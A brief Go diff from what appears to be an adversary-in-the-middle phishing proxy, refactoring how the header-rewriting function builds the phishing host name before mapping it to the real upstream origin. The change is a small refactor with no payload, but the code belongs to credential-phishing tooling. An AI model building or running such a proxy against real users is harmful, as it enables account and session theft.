@@ -42,7 +42,7 @@ func rewriteHeader(req *http.Request, header string, p *aitm.Phishlet) {
 	host := parsed.Hostname()
 
 	for _, ph := range p.ProxyHosts {
-		phishHost := ph.PhishSubdomain + "." + p.BaseDomain
+		phishHost := ph.PhishHost(p.BaseDomain)
 		if strings.EqualFold(host, phishHost) {
 			parsed.Scheme = ph.UpstreamScheme
 			parsed.Host = ph.OriginHost()
